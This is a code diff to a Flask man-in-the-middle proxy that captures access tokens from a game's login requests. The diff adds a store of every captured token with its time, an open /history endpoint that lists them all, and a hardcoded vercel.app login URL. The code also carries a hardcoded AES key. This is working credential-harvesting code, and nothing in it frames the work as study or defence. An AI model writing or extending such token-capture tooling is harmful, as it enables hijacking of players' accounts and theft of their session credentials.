@@ -9,6 +9,7 @@ app = Flask(__name__)
 
 # ---------- In-memory token store ----------
 tokens = {}
+token_history = []
 
 # ---------- AES Keys (same as Termux version) ----------
 AES_KEY = b'Yg&tc%DEuh6%Zc^8'
@@ -113,15 +114,23 @@ def get_token():
     return jsonify({"error": "No token captured yet", "status": "waiting"}), 404
 
 
+@app.route('/history', methods=['GET'])
+def history():
+    """Return all captured tokens with time."""
+    if token_history:
+        return jsonify({
+            "total": len(token_history),
+            "tokens": token_history,
+            "developer": "Anupam Mishra"
+        })
+    return jsonify({"error": "No tokens captured yet", "status": "waiting"}), 404
+
+
 @app.route('/config', methods=['GET'])
 def config():
-    """Return localconfig.json content pointing to this Vercel URL."""
-    # Auto-detect the deployed Vercel URL
-    scheme = request.headers.get('X-Forwarded-Proto', request.scheme)
-    host = request.headers.get('X-Forwarded-Host', request.host)
-    vercel_url = f"{scheme}://{host}/"
+    """Return localconfig.json content."""
     return jsonify({
-        "serverLoginUrl": vercel_url
+        "serverLoginUrl": "https://godanupam.vercel.app/"
     })
 
 
@@ -141,10 +150,15 @@ def proxy(path):
     if 'GetLoginData' in path and body:
         token = extract_token(body)
         if token:
+            now = time.time()
             tokens['latest'] = {
                 'access_token': token,
-                'timestamp': time.time(),
+                'timestamp': now,
             }
+            token_history.append({
+                'access_token': token,
+                'time': time.ctime(now),
+            })
             print(f"[+] 🎯 TOKEN CAPTURED: {token}")
 
     # Forward to real game server
